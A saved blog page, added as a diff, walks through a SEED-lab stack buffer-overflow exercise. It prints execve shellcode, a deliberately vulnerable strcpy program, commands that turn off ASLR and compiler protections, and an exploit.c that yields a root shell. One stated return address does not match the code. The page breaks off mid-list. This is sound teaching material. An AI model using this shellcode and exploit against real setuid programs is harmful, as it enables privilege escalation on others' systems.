@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<!-- saved from url=(0045)https://clickmouse.github.io/Buffer_Overflow/ -->
+<html lang="en" class=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+<meta name="theme-color" content="#f8f5ec">
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="description" content="Buffer-Overflow-Attack"><meta name="keywords" content="linux, seed-lab, gdb, buffer-overflow, clickmouse"><link rel="alternate" href="https://clickmouse.github.io/atom.xml" title="clickmouse"><link rel="shortcut icon" type="image/x-icon" href="https://clickmouse.github.io/favicon.ico?v=2.11.0">
+<link rel="canonical" href="https://clickmouse.github.io/Buffer_Overflow/">
+
+<link rel="stylesheet" type="text/css" href="./Buffer-Overflow-Attack - clickmouse_files/jquery.fancybox.css">
+<link rel="stylesheet" type="text/css" href="./Buffer-Overflow-Attack - clickmouse_files/style.css">
+
+<script src="./Buffer-Overflow-Attack - clickmouse_files/push.js.download"></script><script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script>
+  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":"","latex":false};
+</script>
+
+    <title>Buffer-Overflow-Attack - clickmouse</title>
+  <meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="https://clickmouse.github.io/atom.xml" title="clickmouse" type="application/atom+xml">
+<style type="text/css">.fancybox-margin{margin-right:15px;}</style></head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="https://clickmouse.github.io/" class="logo">clickmouse</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu slideout-menu-left">
+  <ul class="mobile-menu-list"><a href="https://clickmouse.github.io/">
+        <li class="mobile-menu-item">Home
+          </li>
+      </a><a href="https://clickmouse.github.io/archives">
+        <li class="mobile-menu-item">Archives
+          </li>
+      </a><a href="https://clickmouse.github.io/tags">
+        <li class="mobile-menu-item">Tags
+          </li>
+      </a><a href="https://clickmouse.github.io/categories">
+        <li class="mobile-menu-item">Categories
+          </li>
+      </a><a href="https://clickmouse.github.io/about">
+        <li class="mobile-menu-item">About
+          </li>
+      </a></ul>
+</nav>
+<div class="container slideout-panel slideout-panel-left" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="https://clickmouse.github.io/" class="logo">clickmouse</a>
+</div>
+
+<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
+          <a class="menu-item-link" href="https://clickmouse.github.io/">
+            Home
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="https://clickmouse.github.io/archives">
+            Archives
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="https://clickmouse.github.io/tags">
+            Tags
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="https://clickmouse.github.io/categories">
+            Categories
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="https://clickmouse.github.io/about">
+            About
+            </a>
+        </li>
+      </ul></nav>
+</header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content"><article class="post">
+    <header class="post-header">
+      <h1 class="post-title">Buffer-Overflow-Attack
+        </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2020-03-01
+        </span><span class="post-category">
+            <a href="https://clickmouse.github.io/categories/seed-lab/">seed-lab</a>
+            </span>
+        </div>
+    </header>
+
+    <div class="post-toc" id="post-toc" style="position: fixed; top: 20px;">
+    <h2 class="post-toc-title">Contents</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="https://clickmouse.github.io/Buffer_Overflow/#null"><span class="toc-text">Stack layout</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="https://clickmouse.github.io/Buffer_Overflow/#null"><span class="toc-text">Shellcode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="https://clickmouse.github.io/Buffer_Overflow/#null"><span class="toc-text">Vulnerable Source Code</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="https://clickmouse.github.io/Buffer_Overflow/#null"><span class="toc-text">Before Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="https://clickmouse.github.io/Buffer_Overflow/#Shutdown-ASLR"><span class="toc-text">Shutdown ASLR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="https://clickmouse.github.io/Buffer_Overflow/#Change-Link"><span class="toc-text">Change Link</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="https://clickmouse.github.io/Buffer_Overflow/#Shutdown-other-countermeasures-of-GCC"><span class="toc-text">Shutdown other countermeasures of GCC</span></a></li></ol></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="https://clickmouse.github.io/Buffer_Overflow/#null"><span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="https://clickmouse.github.io/Buffer_Overflow/#Exploit-c"><span class="toc-text">Exploit.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="https://clickmouse.github.io/Buffer_Overflow/#GDB-stack"><span class="toc-text">GDB stack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="https://clickmouse.github.io/Buffer_Overflow/#Two-stack-layouts"><span class="toc-text">Two stack layouts</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="https://clickmouse.github.io/Buffer_Overflow/#null"><span class="toc-text">Countermeasures</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="https://clickmouse.github.io/Buffer_Overflow/#ASLR"><span class="toc-text">ASLR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="https://clickmouse.github.io/Buffer_Overflow/#Dash"><span class="toc-text">Dash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="https://clickmouse.github.io/Buffer_Overflow/#Non-execstack-and-stack-guard"><span class="toc-text">Non-execstack and stack guard</span></a></li></ol></li>
+    </div>
+  </div><div class="post-content"><p>This is a blog recording what I learned when doing <code>buffer-overflow attack</code> lab.</p>
+<a id="more"></a>
+<h1>Stack layout</h1>
+<p>The figure below is from the lab instruction from my operating system course.</p>
+<center><a class="fancybox" href="./Buffer-Overflow-Attack - clickmouse_files/stack_layout.png" title=""><img src="./Buffer-Overflow-Attack - clickmouse_files/stack_layout.png" class=""></a></center>
+<h1>Shellcode</h1>
+<p>There are two programs. They are both written by <code>c</code> language. However, one looks like a normal c program, while another one is executing <code>data</code>.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>{ </span><br><span class="line">    <span class="keyword">char</span> *name[<span class="number">2</span>];</span><br><span class="line">	name[<span class="number">0</span>] = <span class="string">"/bin/sh"</span>; </span><br><span class="line">    name[<span class="number">1</span>] = <span class="literal">NULL</span>; </span><br><span class="line">    execve(name[<span class="number">0</span>], name, <span class="literal">NULL</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<blockquote>
+<p><code>execve</code> is a <code>system call</code> of Linux.</p>
+<p>The function of this <code>system call</code> is that it forks a child process and run another program.</p>
+<p><code>1st arg</code>: the name of the file which executes the new program.</p>
+<p><code>2nd arg</code>: the program to be run. It must end with <code>NULL</code></p>
+<p><code>3rd arg</code>: the new environment variable array.</p>
+</blockquote>
+<p>It’s easy to understand the program above. Let’s see another one.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> code[] =</span><br><span class="line">  <span class="string">"\x31\xc0"</span>             <span class="comment">/* xorl    %eax,%eax              */</span></span><br><span class="line">  <span class="string">"\x50"</span>                 <span class="comment">/* pushl   %eax                   */</span></span><br><span class="line">  <span class="string">"\x68"</span><span class="string">"//sh"</span>           <span class="comment">/* pushl   $0x68732f2f            */</span></span><br><span class="line">  <span class="string">"\x68"</span><span class="string">"/bin"</span>           <span class="comment">/* pushl   $0x6e69622f            */</span></span><br><span class="line">  <span class="string">"\x89\xe3"</span>             <span class="comment">/* movl    %esp,%ebx              */</span></span><br><span class="line">  <span class="string">"\x50"</span>                 <span class="comment">/* pushl   %eax                   */</span></span><br><span class="line">  <span class="string">"\x53"</span>                 <span class="comment">/* pushl   %ebx                   */</span></span><br><span class="line">  <span class="string">"\x89\xe1"</span>             <span class="comment">/* movl    %esp,%ecx              */</span></span><br><span class="line">  <span class="string">"\x99"</span>                 <span class="comment">/* cdq                            */</span></span><br><span class="line">  <span class="string">"\xb0\x0b"</span>             <span class="comment">/* movb    $0x0b,%al              */</span></span><br><span class="line">  <span class="string">"\xcd\x80"</span>             <span class="comment">/* int     $0x80                  */</span></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">   <span class="keyword">char</span> buf[<span class="keyword">sizeof</span>(code)];</span><br><span class="line">   <span class="built_in">strcpy</span>(buf, code);</span><br><span class="line">   ((<span class="keyword">void</span>(*)( ))buf)( );</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>Let’s begin with <code>main</code>. <code>buf</code> stores a string which is stored in <code>code[]</code> originally.</p>
+<p><code>void(*)()</code> is a function pointer pointing to a function which returns <code>void</code>. So, the 3rd line of <code>main</code> means that we convert <code>buf</code> to the function we mentioned.</p>
+<p>Now, let’s figure out the meaning of the assembly program of <code>code</code>. The source code is written in <code>x86</code> style here.</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">xorl eax, eax 		; eax = 0</span><br><span class="line">1: pushl eax    	; protect eax</span><br><span class="line">2: pushl 0x68732f2f	; push string "//sh" note: there is no \0 here</span><br><span class="line">3: pushl 0x6e69622f	; push string "/bin"</span><br><span class="line">movl esp, ebx  		; ebx = address of "/bin//sh" (name[0])</span><br><span class="line">4: pushl eax		; push NULL</span><br><span class="line">5: pushl ebx 		; push address of "/bin//sh" </span><br><span class="line">;Think about the model of pointer array（指针数组). It's not hard to understand</span><br><span class="line">movl esp, ecx 		; ecx = address of name(refer to the 1st program)</span><br><span class="line">cdq					; edx = 0 can be replaced by `xorl edx, edx`</span><br><span class="line">movb 0x0b, al		; al = 0x0b --&gt; `execve` system call</span><br><span class="line">int 80				; interrupt</span><br></pre></td></tr></tbody></table></figure>
+<center><a class="fancybox" href="./Buffer-Overflow-Attack - clickmouse_files/execve.png" title=""><img src="./Buffer-Overflow-Attack - clickmouse_files/execve.png" class=""></a></center>
+<center> Fig.1 system call number of execve </center>
+<p>Stack of this program is like this. <code>esp--&gt;</code> means <code>esp</code> is pointing here now. numbers correspond to labels in the program above.</p>
+<center> Table.1 Stack model of the assembly program</center>
+<div class="table-responsive"><table>
+<thead>
+<tr>
+<th style="text-align:center">Stack model</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>ebp</code></td>
+</tr>
+<tr>
+<td style="text-align:center">1: <code>esp --&gt;</code> <code>eax</code></td>
+</tr>
+<tr>
+<td style="text-align:center">2: <code>esp --&gt;</code> <code>0x68732f2f</code></td>
+</tr>
+<tr>
+<td style="text-align:center">3: <code>esp --&gt;</code> <code>0x6e69622f</code></td>
+</tr>
+<tr>
+<td style="text-align:center">4: <code>esp--&gt;</code> <code>eax</code></td>
+</tr>
+<tr>
+<td style="text-align:center">5:<code>esp --&gt;</code> <code>ebx</code>(the value of the 3rd step <code>esp</code>)</td>
+</tr>
+</tbody>
+</table></div>
+<p>Now, we know the 2 programs have the same function.</p>
+<h1>Vulnerable Source Code</h1>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> BUF_SIZE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUF_SIZE 24</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bof</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">buffer</span>[BUF_SIZE];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The following statement has a buffer overflow problem */</span></span><br><span class="line">    <span class="built_in">strcpy</span>(<span class="built_in">buffer</span>, str);       </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">517</span>];</span><br><span class="line">    FILE *badfile;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* Change the size of the dummy array to randomize the parameters</span></span><br><span class="line"><span class="comment">       for this lab. Need to use the array at least once */</span></span><br><span class="line">    <span class="keyword">char</span> dummy[BUF_SIZE];  <span class="built_in">memset</span>(dummy, <span class="number">0</span>, BUF_SIZE);</span><br><span class="line">    <span class="comment">/* 主要是为了改变堆栈结构*/</span></span><br><span class="line"></span><br><span class="line">    badfile = fopen(<span class="string">"badfile"</span>, <span class="string">"r"</span>);</span><br><span class="line">    fread(str, <span class="keyword">sizeof</span>(<span class="keyword">char</span>), <span class="number">517</span>, badfile);</span><br><span class="line">    bof(str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Returned Properly\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>The problem is that <code>strcpy</code> won’t check whether the length of <code>str</code> is shorter than <code>BUF_SIZE</code>.</p>
+<p><code>str</code> will get its content from <code>badfile</code>.</p>
+<h1>Before Attack</h1>
+<p>Before we manage to attack, we need to simplify our work.</p>
+<ol>
+<li>Shutdown <code>ASLR</code>(Address Space Layout Randomization)</li>
+<li>Link <code>sh</code> from <code>dash</code> to <code>zsh</code></li>
+<li>Open <code>execstack</code>(stack can be executed)</li>
+<li>Shutdown stack guard</li>
+</ol>
+<h3 id="Shutdown-ASLR">Shutdown ASLR</h3>
+<p><code>ASLR</code> is a countermeasure of operating system. It can randomize the starting address of heap and stack. We can disable this feature by the following command:</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo sysctl -w kernel.randomize_va_space=0</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="Change-Link">Change Link</h3>
+<p>In Ubuntu 16.04 VMs, <code>bin/sh</code> symbolic link points to the <code>/bin/dash</code> shell. Because in this lab, we want to get the root permission, the process will be executed in a  <code>Set-UID</code> process. It can change the effective UID but not real user ID. However, if <code>dash</code> detects that it is executed in a <code>Set-UID</code> process, it immediately drop the privilege.</p>
+<p>Consequently, we link <code>sh</code> to <code>zsh</code> by the following command:</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ln -sf /bin/zsh /bin/sh</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="Shutdown-other-countermeasures-of-GCC">Shutdown other countermeasures of GCC</h3>
+<p><code>Stack guard</code> and <code>noexecstack</code> are two countermeasures of GNU/GCC to prevent buffer overflows. In the presence of these protections, buffer-overflow attack won’t work. So, we disable these protections.</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o stack -z execstack -fno-stack-protector stack.c</span><br></pre></td></tr></tbody></table></figure>
+<h1>Exploit</h1>
+<h3 id="Exploit-c">Exploit.c</h3>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> shellcode[]=</span><br><span class="line">    <span class="string">"\x31\xc0"</span>             <span class="comment">/* xorl    %eax,%eax              */</span></span><br><span class="line">    <span class="string">"\x50"</span>                 <span class="comment">/* pushl   %eax                   */</span></span><br><span class="line">    <span class="string">"\x68"</span><span class="string">"//sh"</span>           <span class="comment">/* pushl   $0x68732f2f            */</span></span><br><span class="line">    <span class="string">"\x68"</span><span class="string">"/bin"</span>           <span class="comment">/* pushl   $0x6e69622f            */</span></span><br><span class="line">    <span class="string">"\x89\xe3"</span>             <span class="comment">/* movl    %esp,%ebx              */</span></span><br><span class="line">    <span class="string">"\x50"</span>                 <span class="comment">/* pushl   %eax                   */</span></span><br><span class="line">    <span class="string">"\x53"</span>                 <span class="comment">/* pushl   %ebx                   */</span></span><br><span class="line">    <span class="string">"\x89\xe1"</span>             <span class="comment">/* movl    %esp,%ecx              */</span></span><br><span class="line">    <span class="string">"\x99"</span>                 <span class="comment">/* cdq                            */</span></span><br><span class="line">    <span class="string">"\xb0\x0b"</span>             <span class="comment">/* movb    $0x0b,%al              */</span></span><br><span class="line">    <span class="string">"\xcd\x80"</span>             <span class="comment">/* int     $0x80                  */</span></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">517</span>];</span><br><span class="line">    FILE *badfile;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize buffer with 0x90 (NOP instruction) */</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;<span class="built_in">buffer</span>, <span class="number">0x90</span>, <span class="number">517</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* You need to fill the buffer with appropriate contents here */</span> </span><br><span class="line">    <span class="built_in">strcpy</span>(<span class="built_in">buffer</span>+<span class="number">0x24</span>, <span class="string">"\xff\xea\xff\xbf"</span>); <span class="comment">//1</span></span><br><span class="line">    <span class="built_in">strcpy</span>(<span class="built_in">buffer</span>+<span class="number">420</span>, shellcode);			 <span class="comment">//2</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Save the contents to the file "badfile" */</span></span><br><span class="line">    badfile = fopen(<span class="string">"./badfile"</span>, <span class="string">"w"</span>);</span><br><span class="line">    fwrite(<span class="built_in">buffer</span>, <span class="number">517</span>, <span class="number">1</span>, badfile);</span><br><span class="line">    fclose(badfile);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>The shellcode has been explained before.  What we need to write is only two lines of code.</p>
+<ol>
+<li>Put the address of shellcode on the return address of <code>bof</code></li>
+<li>Put shellcode on a valid position of <code>buffer</code>.</li>
+</ol>
+<p>There are 3 numbers here. <code>0x24</code>, <code>\x9c\xeb\ff\bf</code>, <code>420</code>. How can we get them?</p>
+<h3 id="GDB-stack">GDB stack</h3>
+<p>In order to know the stack layout of <code>stack</code>. (this is the process), we need <code>gdb</code> to debug it.</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb stack <span class="comment">#start debugging</span></span><br><span class="line">b bof     <span class="comment">#breakpoint in bof()</span></span><br><span class="line">r 		  <span class="comment">#run</span></span><br></pre></td></tr></tbody></table></figure>
+<p>We can see such a surface like that. Now we are in <code>bof()</code>. PC/EIP now points to <code>0x80484f1</code>.</p>
+<p>We can know the starting address of <code>buffer</code> by observing codes before <code>strcpy</code>. Because <code>buffer</code> is the first parameter of <code>strcpy</code>. The offset between <code>buffer</code>  and <code>$ebp</code> is <code>-0x20</code>.</p>
+<p>According to the stack layout, the address of <code>buffer</code> + <code>0x20</code> + <code>4</code> = <code>return address</code> of <code>bof</code>.</p>
+<p>We have got <code>0x24</code>.</p>
+<center><a class="fancybox" href="./Buffer-Overflow-Attack - clickmouse_files/buf_add.png" title=""><img src="./Buffer-Overflow-Attack - clickmouse_files/buf_add.png" class=""></a></center>
+<p>Actually, <code>420</code> can be changed manually. You can define this number by yourself. However, it may be better if this number is big enough, because it can help us to find the shellcode more easily.</p>
+<p>If we calculate the address of shellcode by the figure above, Let’s do the calculation.</p>
+<ol>
+<li>the address of <code>buffer</code> = <code>$ebp</code> - 0x20 = <code>0xbfffe9f8</code></li>
+<li>shellcode address = <code>0xbfffe9f8</code> + <code>420</code>  = <code>0xbfffeb9c</code></li>
+</ol>
+<p>Can we succeed? Of course.</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -o exploit exploit.c</span><br><span class="line">./exploit</span><br><span class="line">./stack</span><br></pre></td></tr></tbody></table></figure>
+<p>We can see that we have root permission now. However, we need to pay attention to <code>uid = 1000</code>. It means that the real-id is <code>seed</code> but not <code>root</code>.</p>
+<center><a class="fancybox" href="./Buffer-Overflow-Attack - clickmouse_files/success.png" title=""><img src="./Buffer-Overflow-Attack - clickmouse_files/success.png" class=""></a></center>
+<h3 id="Two-stack-layouts">Two stack layouts</h3>
+<p>We have successfully carried out the attack. It’s the truth. However, there is a little mistake here.</p>
+<p>Actually, process running under <code>gdb</code> and process running directly have different stack layouts. Why? Because the environment variables pushed to the stack are different under these two conditions.</p>
+<p>We can succeed because there are lots of <code>nop(0x90)</code> before the shellcode. We jump to <code>nop</code> and run until encountering the shellcode.</p>
+<p>How can we prove this? We need to add a line of code in <code>stack.c</code>. It’s <code>getchar()</code>. The process won’t terminate until it get a character from <code>stdin</code>.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">517</span>];</span><br><span class="line">    FILE *badfile;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* Change the size of the dummy array to randomize the parameters</span></span><br><span class="line"><span class="comment">       for this lab. Need to use the array at least once */</span></span><br><span class="line">    <span class="keyword">char</span> dummy[BUF_SIZE];  <span class="built_in">memset</span>(dummy, <span class="number">0</span>, BUF_SIZE);</span><br><span class="line"></span><br><span class="line">    badfile = fopen(<span class="string">"badfile"</span>, <span class="string">"r"</span>);</span><br><span class="line">    fread(str, <span class="keyword">sizeof</span>(<span class="keyword">char</span>), <span class="number">517</span>, badfile);</span><br><span class="line">    <span class="comment">//wait here</span></span><br><span class="line">    getchar()</span><br><span class="line">    <span class="comment">//   </span></span><br><span class="line">    bof(str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Returned Properly\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>That’s because we want to debug it with <code>gdb</code> when it is executed directly.</p>
+<ol>
+<li>Compile and run the program and wait.</li>
+</ol>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -ostack2 -fno-stack-protector -z execstack stack.c</span><br></pre></td></tr></tbody></table></figure>
+<center><a class="fancybox" href="./Buffer-Overflow-Attack - clickmouse_files/stack2.png" title=""><img src="./Buffer-Overflow-Attack - clickmouse_files/stack2.png" class=""></a></center>
+<ol start="2">
+<li>Open another terminal and get the <code>pid</code> of stack2</li>
+</ol>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -elf | grep stack2</span><br></pre></td></tr></tbody></table></figure>
+<center><a class="fancybox" href="./Buffer-Overflow-Attack - clickmouse_files/pid.png" title=""><img src="./Buffer-Overflow-Attack - clickmouse_files/pid.png" class=""></a></center>
+<ol start="3">
+<li>Attach <code>gdb</code> to this process. This command needs root permission.</li>
+</ol>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gdb attach 6903</span><br></pre></td></tr></tbody></table></figure>
+<center><a class="fancybox" href="./Buffer-Overflow-Attack - clickmouse_files/attach.png" title=""><img src="./Buffer-Overflow-Attack - clickmouse_files/attach.png" class=""></a></center>
+<ol start="4">
+<li>
+<p>Input <code>n/next</code> in <code>gdb</code>, then input a character for <code>stack2</code></p>
+</li>
+<li>
+<p>Input <code>n</code> continually until we go back to <code>main()</code></p>
+</li>
+<li>
